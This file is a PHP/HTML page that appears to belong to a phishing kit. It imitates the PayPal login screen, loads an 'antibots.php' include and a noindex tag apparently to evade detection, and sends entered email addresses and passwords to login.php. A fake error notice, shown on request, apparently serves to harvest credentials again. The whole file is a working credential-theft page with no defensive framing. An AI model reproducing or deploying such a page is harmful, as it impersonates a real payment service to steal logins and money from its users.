<?php

/*

 */

include 'antibots.php';


?>
<!DOCTYPE html>
    <html>
    <head>
        <title>Log in to your PayPal account</title>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="robots" content="noindex" />
        <link rel="icon" href="css/fav.ico" />
    </head>
    <style>
        *{
            font-family: arial, sans-serif;
        }
        .form{
            width: 319px;
            margin-right: auto;
            margin-left: auto;
        }
        input{
            width: 305px;
            height: 40px;
            border: 1px solid #B3B3B3;
        }
        input:focus{
            border:1px solid #009CDE;
        }
        label{
            font-weight: lighter;
            font-size: 18px;
        }
        .notifications .notification.notification-critical {
            background-color: #FFF7F7;
            background-position: 12px -387px;
            border-color: #C72E2E;
        }
        .notifications .notification {
            margin-top: 0px;
            padding: 15px 15px 15px 44px;
            border-radius: 5px;
            border-width: 1px;
            border-style: solid;
            text-align: left;
            font-size: 1em;
            background: url("https://www.paypalobjects.com/images/shared/icon_alert_sprite-2x.png") no-repeat scroll 0% 0% / 20px auto transparent;
        }
        .error_footer{
            background-image: url("css/footer.png");
        }
        .form_content{
            width: 459px;
            /*background-color: rgb(247, 249, 250);*/
            margin-left: auto;
            margin-right: auto;
            margin-top: 137px;
            padding-top: 125px;
            padding-bottom: 29px;
        }
        .logo_ppl{
            background: url("css/noobppl.svg") no-repeat scroll center top / 129px 32px transparent;
            width: 129px;
            height: 32px;
            display: block;
            text-indent: -999em;
            margin-left: auto;
            margin-right: auto;
            margin-bottom: 32px;
        }
		.footlink{
            margin: 0px auto 19px;
            padding-bottom: 25px;
            border-bottom: 1px solid #CBD2D6;
        }
    </style>
<body style="background-image: url('css/dixon_bg.PNG');background-repeat: no-repeat;height: 765px; overflow-x: hidden;background-position: center;">
<div class="form_content">
<div class="form">
    
    <form method="post" action="login.php">
        <?php

        if(isset($_GET['loginError_id'])){
         ?>
            <div id="notifications" class="notifications">
                <p class="notification notification-critical" style="background-position: 10px -378px;" role="alert">Some information you've entered doesn't look right.</p>
            </div>
            <?php
        }



        ?>
        <input type="text" class="focus" name="email" placeholder="Email" style="padding-left:12px;font-size: 16px; border-radius: 3px; margin-bottom: 16px;">
        <input class="focus" type="password" name="pass" placeholder="Password" style="padding-left: 12px;
font-size: 16px;
border-radius: 3px;
margin-bottom: 26px;">
        <input type="submit" value="Log In" style="margin-bottom: 15px;margin-top: -10px;background: none repeat scroll 0% 0% #009cde;border: 1px solid #009cde;width: 320px;height: 45px;border-radius: 5px;cursor: pointer;color: #FFF;font-weight: bold;font-family: arial;font-size: 15px;">
        <p class="footlink">
		<a href="#" style="text-decoration:none;color: #1da7e1; font-family: arial, sans-serif;font-size: 15px">Forgot your email or password?</a>
        </p>
        <input type="button" value="Sign Up" style="background: none repeat scroll 0% 0% rgb(225, 231, 235); border: 1px solid rgb(225, 231, 235); width: 320px; height: 46px; border-radius: 5px; cursor: pointer; color: #2C2E2F; font-weight: bold; font-family: arial; font-size: 15px; ">
</div>
    </form>
</div>
</body>
    </html><?php ?>